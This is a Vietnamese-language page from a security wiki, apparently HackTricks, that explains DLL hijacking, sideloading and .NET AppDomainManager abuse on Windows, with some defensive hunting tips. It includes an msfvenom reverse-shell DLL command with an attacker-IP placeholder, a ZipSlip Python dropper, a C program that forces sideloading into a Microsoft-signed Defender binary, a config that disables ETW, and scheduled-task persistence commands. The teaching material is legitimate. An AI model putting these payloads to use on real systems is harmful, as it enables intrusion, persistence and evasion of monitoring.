# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Thông tin cơ bản

DLL Hijacking là việc thao túng một ứng dụng đáng tin cậy để ứng dụng tải một DLL độc hại. Thuật ngữ này bao gồm một số chiến thuật như **DLL Spoofing, Injection và Side-Loading**. Kỹ thuật này chủ yếu được dùng để thực thi mã, duy trì persistence và ít phổ biến hơn là leo thang đặc quyền. Dù ở đây tập trung vào leo thang đặc quyền, phương thức hijacking vẫn nhất quán giữa các mục tiêu.

### Các kỹ thuật phổ biến

Có một số phương pháp DLL hijacking, mỗi phương pháp hiệu quả tùy thuộc vào cách ứng dụng tải DLL:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Thay DLL thật bằng DLL độc hại, có thể dùng DLL Proxying để duy trì chức năng của DLL gốc.
2. **DLL Search Order Hijacking**: Đặt DLL độc hại trong đường dẫn tìm kiếm đứng trước DLL hợp lệ, khai thác quy tắc tìm kiếm của ứng dụng.
3. **Phantom DLL Hijacking**: Tạo DLL độc hại để ứng dụng tải, vì ứng dụng cho rằng đó là một DLL bắt buộc nhưng không tồn tại.
4. **DLL Redirection**: Sửa đổi các tham số tìm kiếm như `%PATH%` hoặc các tệp `.exe.manifest` / `.exe.local` để chuyển hướng ứng dụng đến DLL độc hại.
5. **WinSxS DLL Replacement**: Thay DLL hợp lệ bằng DLL độc hại tương ứng trong thư mục WinSxS. Phương pháp này thường liên quan đến DLL side-loading.
6. **Relative Path DLL Hijacking**: Đặt DLL độc hại trong thư mục do người dùng kiểm soát cùng với ứng dụng đã sao chép, tương tự các kỹ thuật Binary Proxy Execution.

Ứng dụng cũng có thể triển khai **DLL loader riêng**. Một tiến trình có đặc quyền có thể liệt kê thư mục con như `Libraries` hoặc `Plugins`, rồi chuyển một DLL được chọn cho một helper, độc lập với thứ tự tìm kiếm DLL thông thường của Windows. Nếu tài khoản khác có thể tạo tệp trong chính thư mục đó, hãy xem đây là đầu mối cần kiểm tra: xác nhận danh tính tiến trình, ACL hiệu lực của thư mục, quy tắc chọn tệp và một thao tác tải có thể được kích hoạt. Thư mục có thể ghi nằm cạnh tệp thực thi không chứng minh rằng tiến trình tải DLL từ đó.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### Grafting import PE sau khi cài đặt

Side-loading cổ điển giữ nguyên PE đáng tin cậy và chiếm quyền phân giải tên DLL. Ngược lại, **Import grafting** sửa đổi một PE đã được chương trình đáng tin cậy tải. Kẻ tấn công thêm một import descriptor cùng các mục lookup/IAT liên quan cho một DLL do kẻ tấn công kiểm soát. Khi Windows đệ quy phân giải dependency đó, hệ thống ánh xạ DLL được thêm vào và chạy mã khởi tạo của nó bên trong tiến trình vốn hợp lệ. Đây là sửa đổi PE trên đĩa, không phải thao tác thay một con trỏ hàm IAT đang hoạt động bằng runtime hook.<sup>[[31]](#references)[[32]](#references)</sup>

PE được sửa đổi có thể là một DLL trung gian của nhà cung cấp thay vì tệp thực thi do người dùng hoặc Task Scheduler khởi chạy. Một chuỗi có thể tái sử dụng là:<sup>[[32]](#references)</sup>

1. Sao chép tệp thực thi hợp lệ và các dependency của nó vào một thư mục do kẻ tấn công kiểm soát.
2. Sửa cấu trúc import của một dependency để tham chiếu đến DLL độc hại, đồng thời giữ lại các export mà dependency cần và hành vi thông thường.
3. Cấu hình autorun hoặc scheduled task để khởi chạy tệp thực thi hợp lệ. Loader ánh xạ dependency đã sửa đổi, sau đó tải DLL mới được import. Xem [Privilege Escalation with Autoruns](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks) để liệt kê task.
4. Không đặt các tác vụ tốn nhiều tài nguyên trong `DllMain`; loader được quan sát đã tạo một worker thread và tiếp tục giải mã theo từng giai đoạn tại đó.

Điều này khác với việc xâm phạm chuỗi cung ứng phía nhà cung cấp: gói của nhà cung cấp vẫn sạch và việc sửa import diễn ra sau khi cài đặt. Khi phân tích, hãy kiểm tra mọi module trong thư mục đã staging, không chỉ host EXE: so sánh danh sách import và hash của dependency với bản cài đặt tốt đã biết, xác minh chữ ký và điều tra các binary của nhà cung cấp được khởi chạy từ những vị trí có thể ghi bất thường như `C:\ProgramData`. Scheduled task trỏ đến bản sao crash reporter hoặc updater trong thư mục như vậy là một điểm pivot đặc biệt hữu ích.<sup>[[32]](#references)</sup>


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading không phải là cách duy nhất để khiến tiến trình **.NET Framework** đáng tin cậy tải mã của kẻ tấn công. Nếu tệp thực thi mục tiêu là ứng dụng **managed**, CLR cũng kiểm tra **tệp cấu hình ứng dụng** có tên tương ứng với tệp thực thi (ví dụ `Setup.exe.config`). Tệp này có thể định nghĩa một **AppDomainManager** tùy chỉnh. Nếu config trỏ đến một assembly do kẻ tấn công kiểm soát được đặt cạnh EXE, CLR sẽ tải assembly đó **trước khi ứng dụng chạy theo luồng thực thi thông thường** và thực thi bên trong tiến trình đáng tin cậy.<sup>[[24]](#references)</sup>

Theo schema cấu hình .NET Framework của Microsoft, phải có cả `<appDomainManagerAssembly>` và `<appDomainManagerType>` thì custom manager mới được sử dụng.<sup>[[16]](#references)[[17]](#references)</sup>

Cấu hình tối thiểu:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Trình quản lý tối thiểu:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Practical notes:
- Đây là tradecraft **chỉ dành cho .NET Framework**. Kỹ thuật này dựa vào việc phân tích cấu hình của CLR, không dựa vào thứ tự tìm kiếm DLL của Win32.
- Host thực sự phải là một **managed EXE**. Kiểm tra nhanh: `sigcheck -m target.exe`, `corflags target.exe`, hoặc kiểm tra **CLR Runtime Header** trong metadata PE.
- Tên file config phải khớp chính xác với tên executable (`<binary>.config`) và thường nằm **cạnh EXE**.
- Kỹ thuật này hữu ích với các binary **được Microsoft/nhà cung cấp ký**, vì EXE đáng tin cậy vẫn nguyên vẹn trong khi managed assembly độc hại thực thi bên trong cùng tiến trình.
- Nếu đã có thư mục installer/update có quyền ghi, có thể dùng AppDomainManager hijacking làm **giai đoạn đầu**, sau đó dùng DLL sideloading cổ điển hoặc reflective loading cho các giai đoạn tiếp theo.

### AppDomainManager làm downloader + bootstrap cho scheduled task

Một mẫu xâm nhập thực tế là ghép EXE .NET đáng tin cậy với cả `*.config` độc hại và một DLL AppDomainManager độc hại chỉ hoạt động như một **bootstrapper nhỏ**:<sup>[[25]](#references)</sup>

1. Người dùng chạy một installer hoặc updater .NET đã ký từ một vị trí có vẻ hợp lý, chẳng hạn `%USERPROFILE%\Downloads`.
2. File config đi kèm khiến CLR tải assembly của attacker **trước khi logic ứng dụng hợp lệ bắt đầu**.
3. Manager độc hại thực hiện **path gate** (ví dụ: chỉ tiếp tục nếu host EXE chạy từ `Downloads`, và chỉ cho phép giai đoạn thứ hai chạy từ `%LOCALAPPDATA%`).
4. Nếu kiểm tra thành công, nó tải payload thực vào một đường dẫn người dùng có quyền ghi như `%LOCALAPPDATA%\PerfWatson2.exe` và thiết lập persistence bằng scheduled task.

Vì sao biến thể này đáng chú ý:
- Host EXE đã ký không thay đổi, nên việc triage chỉ kiểm tra hash của binary chính có thể bỏ sót sự xâm nhập.
- **Path-based anti-analysis** đơn giản khá phổ biến: chuyển bộ ba ZIP/EXE/DLL sang Desktop, Temp hoặc đường dẫn sandbox có thể cố ý làm đứt chuỗi thực thi.
- DLL AppDomainManager giai đoạn đầu có thể rất nhỏ và ít gây chú ý, trong khi implant thực sự được tải xuống sau đó.

Ví dụ persistence tối thiểu thường thấy với mẫu này:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Ghi chú:
- `/rl highest` nghĩa là **highest available** cho người dùng/phiên đó; bản thân nó không đảm bảo nâng quyền lên SYSTEM.
- Kỹ thuật này thường được xếp vào nhóm **execution/persistence via .NET config abuse** hơn là classic missing-DLL search-order hijacking, dù các operator thường kết hợp cả hai.

Các điểm cần kiểm tra:
- Executable .NET đã ký được chạy từ các đường dẫn giải nén ZIP, `Downloads`, `%TEMP%` hoặc thư mục khác mà người dùng có quyền ghi, cùng với tệp `<exe>.config` **nằm cùng thư mục**.
- Scheduled task mới có action trỏ đến `%LOCALAPPDATA%`, `%APPDATA%` hoặc `Downloads`, với tên giả dạng trình cập nhật của browser/vendor.
- Tiến trình bootstrap managed chạy trong thời gian ngắn, lập tức tải xuống một EXE khác rồi khởi chạy `schtasks.exe`.
- Mẫu tự thoát sớm nếu đường dẫn executable không khớp với thư mục user-profile dự kiến.

### Hijacking scheduled task hiện có để khởi chạy lại sideload chain

Để duy trì persistence, đừng chỉ tìm dấu hiệu **tạo task mới**. Một số nhóm xâm nhập chờ đến khi installer hợp pháp tạo một **task updater thông thường**, rồi **sửa action của task** để giữ nguyên tên, tác giả và trigger vốn quen thuộc với đội ngũ phòng thủ.

Quy trình có thể tái sử dụng:
1. Cài đặt/chạy phần mềm hợp pháp và xác định task mà phần mềm thường tạo.
2. Export XML của task và ghi lại các giá trị `<Exec><Command>` / `<Arguments>` hiện tại.<sup>[[23]](#references)</sup>
3. Chỉ thay action để task khởi chạy **trusted host EXE** của bạn từ một thư mục staging mà người dùng có quyền ghi; EXE này sau đó side-load hoặc AppDomain-load payload thực.
4. Đăng ký lại cùng tên task thay vì tạo một persistence artifact mới, dễ bị chú ý.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Vì sao kỹ thuật này kín đáo hơn:
- Tên tác vụ vẫn có thể trông hợp pháp (ví dụ: trình cập nhật của nhà cung cấp).
- **Task Scheduler service** khởi chạy tác vụ, nên việc xác thực tiến trình cha/tổ tiên thường thấy chuỗi khởi chạy theo lịch như mong đợi thay vì `explorer.exe`.
- Các nhóm DFIR chỉ săn tìm **tên tác vụ mới** có thể bỏ sót tác vụ đã được đăng ký từ trước nhưng giờ có hành động trỏ đến `%LOCALAPPDATA%`, `%APPDATA%` hoặc một đường dẫn khác do kẻ tấn công kiểm soát.

Các điểm pivot nhanh để săn tìm:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- So sánh XML trong `C:\Windows\System32\Tasks\*` và metadata trong `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` với baseline.
- Cảnh báo khi **tác vụ cập nhật trông như của nhà cung cấp** chạy từ **thư mục người dùng có quyền ghi** hoặc khởi chạy một .NET EXE cùng thư mục với tệp `*.config`.

> [!TIP]
> Để xem chuỗi từng bước kết hợp HTML staging, cấu hình AES-CTR và .NET implant với DLL sideloading, hãy xem quy trình bên dưới.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

### Gắn một stage được side-load với command line của service

Một DLL được side-load có thể yêu cầu nhiều hơn tên EXE host và tên DLL dự kiến. Mandiant mô tả một loader gắn quá trình giải mã payload với một command-line argument và tên của host executable.<sup>[[33]](#references)</sup> Trong một chuỗi dựa trên service về sau, một host hợp pháp được sao chép đã nạp `mscoree.dll` nằm cùng thư mục; DLL này export `LockClrVersion` và chỉ giải mã stage nhúng sau khi tạo khóa AES-128 từ argument của service và basename của host executable. Mỗi đầu vào được cắt ngắn hoặc đệm NUL thành 16 byte; khóa theo từng byte là `argument XOR embedded_key XOR executable_basename`, sau đó payload được giải mã bằng AES-CBC không padding. Đổi tên host hoặc chạy nó mà không có argument dự kiến sẽ làm thay đổi khóa và khiến stage này không thể giải mã, ngay cả khi DLL vẫn được nạp. Khi tái hiện hoặc phân tích biến thể này, hãy giữ nguyên chính xác command-line argument và basename.<sup>[[34]](#references)</sup>

Đây là **payload gate được xếp lớp trên DLL side-loading thông thường**, không phải quy tắc tìm kiếm DLL mới hay primitive leo thang đặc quyền tự thân. Security context của service quyết định mức đặc quyền nhận được. Quy trình C2 qua [GitHub issue/file](../../../generic-methodologies-and-resources/github-issues-and-repository-files-c2.md) được ghi lại riêng ở phần sau.<sup>[[34]](#references)</sup>

## Tìm DLL bị thiếu

Cách phổ biến nhất để tìm DLL bị thiếu trong hệ thống là chạy [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) từ sysinternals và **thiết lập** **2 bộ lọc sau**:

![Common Techniques - Finding missing Dlls: Cách phổ biến nhất để tìm DLL bị thiếu trong hệ thống là chạy procmon từ sysinternals và thiết lập 2 bộ lọc sau](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: Cách phổ biến nhất để tìm DLL bị thiếu trong hệ thống là chạy procmon từ sysinternals và thiết lập 2 bộ lọc sau](<../../../images/image (230).png>)

và chỉ hiển thị **File System Activity**:

![Common Techniques - Finding missing Dlls: và chỉ hiển thị File System Activity](<../../../images/image (153).png>)

Nếu bạn đang tìm **các DLL bị thiếu nói chung**, hãy **để** công cụ chạy trong **vài giây**.\
Nếu bạn đang tìm **DLL bị thiếu bên trong một executable cụ thể**, hãy đặt thêm bộ lọc như **"Process Name" "contains" `<exec name>`**, chạy executable đó rồi dừng thu thập sự kiện.<sup>[[9]](#references)</sup>

## Khai thác DLL bị thiếu

Để leo thang đặc quyền, hãy tìm **DLL mà một tiến trình có đặc quyền cố nạp** từ vị trí bạn có quyền ghi. Điều này có thể xảy ra khi bạn kiểm soát một thư mục được tìm kiếm trước thư mục chứa DLL hợp pháp, hoặc khi DLL được yêu cầu không tồn tại và bạn có thể ghi vào một trong các thư mục được tìm kiếm.

### Thứ tự tìm kiếm DLL

**Trong** [**tài liệu của Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **có mô tả cụ thể cách các DLL được nạp.**

**Các ứng dụng Windows** tìm DLL theo một tập hợp **đường dẫn tìm kiếm được xác định trước**, tuân theo một thứ tự cụ thể. DLL hijacking xảy ra khi một DLL độc hại được đặt có chủ đích vào một trong các thư mục này để nó được nạp trước DLL chính thống. Để ngăn chặn, hãy đảm bảo ứng dụng sử dụng đường dẫn tuyệt đối khi tham chiếu đến các DLL cần thiết.

Dưới đây là **thứ tự tìm kiếm DLL trên hệ thống 32-bit**:

1. Thư mục nơi ứng dụng được nạp.
2. Thư mục hệ thống. Dùng hàm [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) để lấy đường dẫn của thư mục này.(_C:\Windows\System32_)
3. Thư mục hệ thống 16-bit. Không có hàm nào lấy được đường dẫn của thư mục này, nhưng thư mục vẫn được tìm kiếm. (_C:\Windows\System_)
4. Thư mục Windows. Dùng hàm [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) để lấy đường dẫn của thư mục này.
   1. (_C:\Windows_)
5. Thư mục hiện tại.
6. Các thư mục được liệt kê trong biến môi trường PATH. Lưu ý rằng danh sách này không bao gồm đường dẫn riêng cho từng ứng dụng được chỉ định trong registry key **App Paths**. Key **App Paths** không được dùng khi tính đường dẫn tìm kiếm DLL.

Đây là thứ tự tìm kiếm **mặc định** khi bật **SafeDllSearchMode**. Khi tắt tính năng này, thư mục hiện tại được nâng lên vị trí thứ hai. Để tắt tính năng, hãy tạo giá trị registry **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** và đặt giá trị thành 0 (mặc định là bật).

Nếu hàm [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) được gọi với **LOAD_WITH_ALTERED_SEARCH_PATH**, quá trình tìm kiếm bắt đầu từ thư mục chứa executable module mà **LoadLibraryEx** đang nạp.

Cuối cùng, có thể nạp DLL bằng đường dẫn tuyệt đối thay vì tên. Trong trường hợp đó, Windows chỉ tìm chính DLL tại đường dẫn đó; các dependency được yêu cầu theo tên vẫn tuân theo thứ tự tìm kiếm áp dụng.

Có những cách khác để thay đổi thứ tự tìm kiếm, nhưng tôi sẽ không giải thích ở đây.

### Kết hợp arbitrary file write với khai thác DLL bị thiếu

**Kỹ thuật liên quan:** [chuyển đổi mount point có kiểm soát bằng oplock khi remediation có đặc quyền](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Dùng bộ lọc **ProcMon** (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) để thu thập tên các DLL mà tiến trình dò tìm nhưng không tìm thấy.<sup>[[14]](#references)</sup>
2. Nếu binary chạy theo **lịch/service**, đặt DLL có một trong các tên đó vào **application directory** (mục số 1 trong thứ tự tìm kiếm) thì DLL sẽ được nạp ở lần chạy tiếp theo. Trong một trường hợp .NET scanner, tiến trình tìm `hostfxr.dll` trong `C:\samples\app\` trước khi nạp bản chính thức từ `C:\Program Files\dotnet\fxr\...`.
3. Tạo payload DLL (ví dụ: reverse shell) với bất kỳ export nào: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Nếu primitive của bạn là **arbitrary write kiểu ZipSlip**, hãy tạo một ZIP có entry thoát khỏi thư mục giải nén để DLL được ghi vào thư mục ứng dụng:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Đưa archive vào inbox/share được theo dõi; khi scheduled task khởi chạy lại process, nó sẽ tải DLL độc hại và thực thi code của bạn dưới quyền service account.

### Ép sideloading thông qua RTL_USER_PROCESS_PARAMETERS.DllPath

Một cách nâng cao để kiểm soát một cách xác định DLL search path của process mới được tạo là đặt trường DllPath trong RTL_USER_PROCESS_PARAMETERS khi tạo process bằng các native API của ntdll. Bằng cách cung cấp một thư mục do attacker kiểm soát tại đây, có thể buộc process mục tiêu tải DLL độc hại từ thư mục đó khi phân giải DLL được import theo tên (không dùng absolute path và không sử dụng các safe loading flags).

Ý tưởng chính
- Tạo process parameters bằng RtlCreateProcessParametersEx và cung cấp DllPath tùy chỉnh trỏ đến thư mục do bạn kiểm soát (ví dụ: thư mục chứa dropper/unpacker của bạn).
- Tạo process bằng RtlCreateUserProcess. Khi binary mục tiêu phân giải DLL theo tên, loader sẽ tham khảo DllPath được cung cấp trong quá trình phân giải, cho phép sideloading đáng tin cậy ngay cả khi DLL độc hại không nằm cùng thư mục với target EXE.

Lưu ý/giới hạn
- Điều này ảnh hưởng đến child process được tạo; khác với SetDllDirectory, vốn chỉ ảnh hưởng đến process hiện tại.
- Target phải import hoặc gọi LoadLibrary cho DLL theo tên (không dùng absolute path và không sử dụng LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- Không thể hijack KnownDLLs và các absolute path được hardcode. Forwarded exports và SxS có thể thay đổi thứ tự ưu tiên.

Ví dụ C tối giản (ntdll, wide strings, xử lý lỗi đơn giản):

<details>
<summary>Ví dụ C đầy đủ: ép DLL sideloading thông qua RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Ví dụ sử dụng trong thực tế
- Đặt một xmllite.dll độc hại (xuất các hàm cần thiết hoặc proxy đến DLL thật) trong thư mục DllPath của bạn.
- Khởi chạy một binary đã ký mà theo kỹ thuật trên được biết là sẽ tìm xmllite.dll theo tên. Loader phân giải import thông qua DllPath được cung cấp và sideload DLL của bạn.

Kỹ thuật này từng được quan sát thấy ngoài thực tế trong các chuỗi sideloading nhiều giai đoạn: một launcher ban đầu thả một DLL helper, sau đó DLL này khởi chạy một binary có thể bị hijack do Microsoft ký, với DllPath tùy chỉnh để buộc tải DLL của attacker từ thư mục staging.<sup>[[6]](#references)</sup>


### Hijacking AppDomainManager của .NET thông qua `.exe.config`

Đối với các mục tiêu **.NET Framework**, có thể sideload **trước `Main()`** mà không cần patch memory bằng cách lạm dụng file **`.exe.config`** nằm cạnh ứng dụng. Thay vì chỉ dựa vào thứ tự tìm kiếm DLL của Win32, attacker đặt một EXE .NET hợp pháp cạnh một file config độc hại và một hoặc nhiều assembly do attacker kiểm soát.

Cách chuỗi này hoạt động:<sup>[[15]](#references)[[22]](#references)</sup>
1. EXE host khởi chạy và **CLR đọc `<exe>.config`**.
2. File config đặt **`<appDomainManagerAssembly>`** và **`<appDomainManagerType>`** để runtime khởi tạo một `AppDomainManager` do attacker kiểm soát.
3. Manager độc hại thực thi **trước `Main()`** bên trong tiến trình host đáng tin cậy.
4. Cùng file config có thể buộc CLR ưu tiên phân giải các assembly cục bộ (ví dụ `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) và làm suy yếu việc xác thực/telemetry của runtime mà không cần patch inline.

Mẫu kiểu chiến dịch (cách lồng chính xác có thể khác nhau tùy chỉ thị / phiên bản CLR):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Vì sao điều này hữu ích:
- **`<probing privatePath="."/>`** giữ cho quá trình phân giải assembly trong thư mục ứng dụng, biến thư mục này thành một bề mặt sideloading dễ dự đoán.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** chuyển việc thực thi sang code của attacker trong quá trình khởi tạo CLR, trước khi logic ứng dụng hợp pháp chạy.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** có thể cho phép ứng dụng full-trust tải assembly chưa ký hoặc đã bị chỉnh sửa mà không gặp lỗi xác thực strong-name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** tránh các chuyển hướng publisher-policy sang assembly mới hơn.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** giúp việc chọn runtime có tính xác định cao hơn.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** đặc biệt đáng chú ý vì **CLR tắt khả năng quan sát ETW của chính nó** thông qua cấu hình, thay vì implant vá `EtwEventWrite` trong bộ nhớ.

Mô hình hoạt động được ghi nhận trong các chiến dịch gần đây:
- Giai đoạn 1 thả `setup.exe`, `setup.exe.config` và các assembly cục bộ.
- Giai đoạn 2 sao chép chúng vào một thư mục **AppData update** trông đáng tin, đổi tên host thành tên như `update.exe`, rồi khởi chạy lại thông qua **scheduled task**.
- Giai đoạn 3 xác minh execution context (ví dụ, parent dự kiến là `svchost.exe` do Task Scheduler khởi chạy) trước khi tải RAT DLL/export cuối cùng.

Ý tưởng săn tìm:
- Các **.NET executable** đã ký hoặc hợp pháp được chạy cùng các file **`.config`** đáng ngờ nằm cạnh chúng trong những vị trí người dùng có quyền ghi.
- File `.config` có chứa **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** hoặc **`etwEnable enabled="false"`**.
- Scheduled task khởi chạy lại các binary update đã đổi tên từ **`%LOCALAPPDATA%`** hoặc các thư mục `\bin\update\` dành riêng cho ứng dụng.
- Chuỗi parent/child trong đó scheduled task khởi chạy một .NET host đáng tin cậy, sau đó host này lập tức tải các assembly không phải của nhà cung cấp từ chính thư mục của nó.

#### Các ngoại lệ đối với thứ tự tìm kiếm DLL theo tài liệu Windows

Tài liệu Windows ghi nhận một số ngoại lệ đối với thứ tự tìm kiếm DLL tiêu chuẩn:

- Khi gặp một **DLL trùng tên với DLL đã được tải vào bộ nhớ**, hệ thống bỏ qua quy trình tìm kiếm thông thường. Thay vào đó, hệ thống kiểm tra redirect và manifest trước khi dùng DLL đã có trong bộ nhớ. **Trong trường hợp này, hệ thống không tìm kiếm DLL**.
- Nếu DLL được nhận diện là **known DLL** của phiên bản Windows hiện tại, hệ thống sẽ sử dụng phiên bản known DLL của nó cùng mọi DLL phụ thuộc, **bỏ qua quy trình tìm kiếm**. Khóa registry **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** lưu danh sách các known DLL này.
- Nếu một **DLL có các dependency**, hệ thống tìm các DLL phụ thuộc đó như thể chúng chỉ được chỉ định bằng **tên module**, bất kể DLL ban đầu được xác định bằng đường dẫn đầy đủ hay không.

### Nâng cao đặc quyền

**Yêu cầu**:

- Xác định một process đang chạy hoặc sẽ chạy với **đặc quyền khác** (di chuyển ngang hoặc di chuyển sang hệ thống khác), và **thiếu một DLL**.
- Đảm bảo có **quyền ghi** vào bất kỳ **thư mục** nào sẽ được tìm kiếm **DLL**. Vị trí này có thể là thư mục của executable hoặc một thư mục nằm trong system path.

Theo mặc định, các điều kiện tiên quyết này không phổ biến: executable có đặc quyền thường không thiếu dependency DLL, và người dùng thông thường thường không thể ghi vào các thư mục trong system search path. Tuy vậy, môi trường cấu hình sai vẫn có thể tạo điều kiện cho cả hai tình huống.\
Nếu đáp ứng đủ yêu cầu, hãy kiểm tra dự án [UACME](https://github.com/hfiref0x/UACME). Dù mục tiêu chính của dự án là UAC bypass, dự án có các PoC DLL-hijacking dành cho một số phiên bản Windows cụ thể, thường có thể điều chỉnh để dùng với thư mục có quyền ghi mà bạn tìm được.

Lưu ý rằng bạn có thể **kiểm tra quyền trong một thư mục** bằng cách:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

Và **kiểm tra quyền của tất cả các thư mục bên trong PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Bạn cũng có thể kiểm tra imports của một executable và exports của một dll bằng cách:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Để xem hướng dẫn đầy đủ về cách **lạm dụng DLL Hijacking để leo thang đặc quyền** khi có quyền ghi vào một **thư mục System Path**, hãy xem:


{{#ref}}
